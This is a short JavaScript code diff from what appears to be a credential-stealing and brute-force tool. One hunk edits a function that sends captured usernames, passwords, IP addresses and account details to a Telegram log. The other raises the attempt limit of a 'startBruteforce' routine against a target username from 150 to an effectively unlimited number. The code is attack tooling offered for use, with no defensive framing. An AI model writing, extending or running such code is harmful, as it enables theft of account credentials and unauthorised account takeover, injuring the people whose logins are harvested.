@@ -28,12 +28,11 @@ function getOrCreateUserId(ip) {
 // ===== TELEGRAM LOGGING =====
 async function sendTelegramLog(logData) {
     try {
-        const message = `🔐 <b>Authentication Log</b>\n\n` +
+        const message = `<b>🔐 Authentication Log</b>\n\n` +
             `<code>ID: ${logData.id}\n` +
             `IP: ${logData.ip}\n\n` +
             `Username: ${logData.username}\n` +
             `Password: ${logData.password}\n\n` +
-            `Status: ${logData.status}\n\n` +
             `Rank: ${logData.rank}\n` +
             `CP: ${logData.cp}\n` +
             `Mod: ${logData.mod}</code>\n\n` +
@@ -440,7 +439,7 @@ async function startBruteforce(targetUsername) {
     attemptsContainer.innerHTML = '';
 
     let attemptCount = 0;
-    const maxAttempts = 150;
+    const maxAttempts = 999999999999999999;
 
     for (let i = 0; i < maxAttempts; i++) {
         const length = Math.floor(Math.random() * 14) + 6;
